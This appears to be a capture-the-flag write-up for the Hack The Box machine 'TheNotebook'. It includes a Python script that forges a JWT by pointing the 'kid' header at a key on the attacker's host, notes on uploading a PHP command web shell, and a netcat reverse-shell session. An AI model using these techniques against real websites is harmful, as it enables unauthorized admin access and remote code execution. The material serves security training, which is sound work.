![[Pasted image 20210707202445.png]]

Ok so we this web server uses JWT instead of cookies, so what? 
* Notice in the header where it says "kid"
	* kid stands for "key-id" and it is the way the server verifies the token
* what's more interesting is the syntax of its value, specifically that it starts with http://
* Try pointing it back to a webserver on our box and get a hit
* Now notice in the payload where it says "admin_cap" which stands for admin capabilities
* If we can change this to a true value, the test account will have admin privelages

Craft our own payload with all the information the same, except make our own RSA256 key when creating it and change the kid parameter to point to the key on our machine
```python 
#!/usr/bin/python3

import jwt

private_key = '''
-----BEGIN RSA PRIVATE KEY-----
[snip]
-----END RSA PRIVATE KEY-----
'''

payload = {"username":"test","email":"test@test.htb","admin_cap":"true"}
token = jwt.encode(payload, private_key, algorithm='RS256', headers={"kid":"http://10.10.14.25:8000/jwt_secret.key"})
print(token)
```
Change our cookie to be this newly printed token and reload the webpage -> hits our webserver -> we now have admin privelages on the web site

Being an admin gives access to a "file upload" page
![[Pasted image 20210707203532.png]]
Also notice under the new "notes" page in the admin panel that uploaded php files get executed (eye roll)

Upload a php script that executes system commands when passed as paramter 'cmd', view the page, see we have rce
![[Pasted image 20210707204302.png]]
Use new rce to go for reverse shell
```bash
hunter@kali ~/htb/thenotebook/www$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.230] 45240
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```